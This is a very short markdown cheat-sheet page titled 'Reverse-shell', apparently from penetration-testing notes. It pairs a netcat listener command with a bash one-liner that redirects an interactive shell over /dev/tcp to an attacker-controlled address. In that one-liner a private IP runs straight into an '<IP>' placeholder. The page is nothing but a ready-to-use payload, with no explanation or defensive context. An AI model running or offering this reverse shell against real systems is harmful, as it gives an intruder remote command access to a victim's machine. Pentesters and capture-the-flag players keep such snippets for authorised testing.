---
description: nc -lvp <PORT>
---

# Reverse-shell

### Bash

```
bash -i >& /dev/tcp/192.168.119.164<IP>/<PORT> 0>&1
```
